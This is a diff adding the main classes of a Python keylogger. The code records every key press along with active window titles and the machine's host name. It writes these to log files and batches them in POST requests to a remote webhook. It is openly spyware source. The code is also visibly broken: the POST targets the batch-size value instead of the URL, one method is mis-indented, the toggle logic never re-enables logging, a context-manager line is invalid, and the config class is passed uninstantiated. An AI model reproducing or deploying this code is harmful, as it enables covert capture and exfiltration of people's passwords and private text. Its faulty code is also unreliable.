@@ -274,3 +274,248 @@ class LogManager:
         with self._lock:
             self._file.close()
 
+
+class WebhookDelivery:
+    """
+    Batched HTTP deliveery of events to a remote endpoint
+    """
+    def __init__(self, config: KeyloggerConfig):
+        self.config = config
+        self.event_buffer: list[KeyEvent] = []
+        self.buffer_lock = Lock()
+        self.enable = bool(config.webhook_url and requests)
+
+    def add_event(self, event: KeyEvent) -> None:
+        """
+        Buffer an event and deliver when batch is full
+        """
+        if not self.enable:
+            return
+
+        batch: list[KeyEvent] | None = None
+        with self.buffer_lock:
+            self.event_buffer.append(event)
+            if (len(self.event_buffer)
+                    >= self.config.webhook_batch_size):
+                batch = self.event_buffer
+                self.event_buffer = []
+        
+        if batch:
+            self._deliver_batch(batch)
+
+    def _deliver_batch(
+        self,
+        events: list[KeyEvent],
+    ) -> None:
+        """
+        POST buffered events to the webhook endpoint
+        """
+        if not events or not self.config.webhook_url:
+            return
+
+        payload = {
+            "timestamp": (datetime.now().isoformat()),
+            "host": platform.node(),
+            "events": [e.to_dict() for e in events],
+        }
+
+        try:
+            response = requests.post(
+                self.config.webhook_batch_size,
+                json = payload,
+                timeout = WEBHOOK_TIMEOUT_SECS,
+            )
+            if not response.ok:
+                logging.warning(
+                    "Webhook returned %s",
+                    response.status_code,
+                )
+        except Exception:
+            logging.error(
+                "Webhook delivery failed",
+                exc_info=True,
+            )
+
+    def flush(self) -> None:
+        """
+        Force delivery of remaining buffered evenrs
+        """
+        batch: list[KeyEvent] | None = None
+        with self.buffer_lock:
+            if self.event_buffer:
+                batch = self.event_buffer
+                self.event_buffer = []
+
+        if batch:
+            self._deliver_batch(batch)
+
+class Keylogger:
+    """
+    Cordinates listener, log writer, and webhook
+    """
+    def __init__(self, config: KeyloggerConfig):
+        self.config = config
+        self.log_manager = LogManager(config)
+        self.webhook = WebhookDelivery(config)
+        self.window_tracker = WindowTracker()
+
+        self.is_running = Event()
+        self.is_logging = Event()
+        self.listener: keyboard.Listener | None = (None)
+
+        self._current_window: str | None = None
+        self._last_window_check = datetime.now()
+
+    def _update_active_window(self) -> None:
+        """
+        Update cached window title periodically
+        """
+        if not self.config.enable_window_tracking:
+            return
+
+        now = datetime.now()
+        elapsed = (now - self._last_window_check).total_seconds()
+
+        if (elapsed >= self.config.window_check_interval):
+            self._current_window = (
+                self.window_tracker.get_active_window()
+            )
+            self._last_window_check = now
+
+    def _process_key(
+        self,
+        key: Key | KeyCode,
+    ) -> tuple[str,
+               KeyType]:
+        """
+        Convert key to string representation and type
+        """
+    if isinstance(key, Key):
+        lable = SPECIAL_KEYS.get(key)
+        if lable:
+            return lable, KeyType.SPECIAL
+        return (
+            f"{key.name.upper()}",
+            KeyType.SPECIAL,
+        )
+
+        if hasattr(key, 'char') and key.char:
+            return key.char, KeyType.CHAR
+
+        return "[UNKNOWN]", KeyType.UNKNOWN
+
+    def _on_press(
+        self,
+        key: Key | KeyCode,
+        ) -> None:
+        """
+        Callback for key press events
+        """
+        if key == self.config.toggle_key:
+            self._toggle_logging()
+            return
+
+        if not self.is_logging.is_set():
+            return
+
+        self._update_active_window()
+
+        key_str, key_type = self._process_key(key)
+
+        if (key_type == KeyType.SPECIAL
+                and not self.config.log_special_keys):
+                return
+
+        event = KeyEvent (
+            timestamp=datetime.now(),
+            key = key_str,
+            window_title = self._current_window,
+            key_type = key_type,
+        )
+
+        self.log_manager.write_event(event)
+        self.webhook.add_event(event)
+
+    def _toggle_logging(self) -> None:
+        """
+        Toggle logging on/off with the configured key
+        """
+        toggle = (self.config.toggle_key.name.upper())
+
+        if self.is_logging.is_set():
+            self.is_logging.clear()
+            print(
+                f"\n[*] Logging resumed. "
+                f"Press {toggle} to pause. "
+            )
+
+    def start(self) -> None:
+        """
+        Start the keylogger
+        """
+        toggle = (self.config.toggle_key.name.upper())
+        webhook_status = (
+            "Enabled" if self.webhook.enable else "Disabled"
+        )
+
+        print("Keylogger Started")
+        print()
+        print(f"Log Directory: {self.config.log_dir}")
+        print(
+            "Current Log: "
+            f"{self.log_manager.current_log_path.name}"
+        )
+        print(f"Toggle Key: {toggle}")
+        print(f"Webhook: {webhook_status}")
+        print()
+        print("[*] Press"
+            f"{toggle} to start/stop logging")
+        print(f"[*] Press CTRL+C to exit\n")
+
+        self.is_running.set()
+        self.is_logging.set()
+
+        self.listener = keyboard.Listener(on_press = self._on_press)
+        self.listener.start()
+
+        try:
+            with self.is_running.is_set():
+                self.listener.join(
+                    timeout = (LISTENER_JOIN_TIMEOUT_SECS)
+                )
+        except KeyboardInterrupt:
+            self.stop()
+
+    def stop(self) -> None:
+        """
+        Stop the keylogger gracefully
+        """
+        print("\n\n[*] Shutting Down...")
+
+        self.is_running.clear()
+        self.is_logging.clear()
+
+        if self.listener:
+            self.listener.stop()
+
+        self.webhook.flush()
+        self.log_manager.close()
+
+        print("[*] Logs saved to: "
+            f"{self.config.log_dir}")
+        print("[*] Keylogger stopped.")
+
+def main() -> None:
+    """
+    Entry point with default configuration
+    """
+    keylogger = Keylogger(KeyloggerConfig)
+
+    try:
+        keylogger.start()
+    except Exception as e:
+        print(f"\n[!] Error {e}")
+        keylogger.stop()
+
+if __name__ == '__main__':
+    main()  
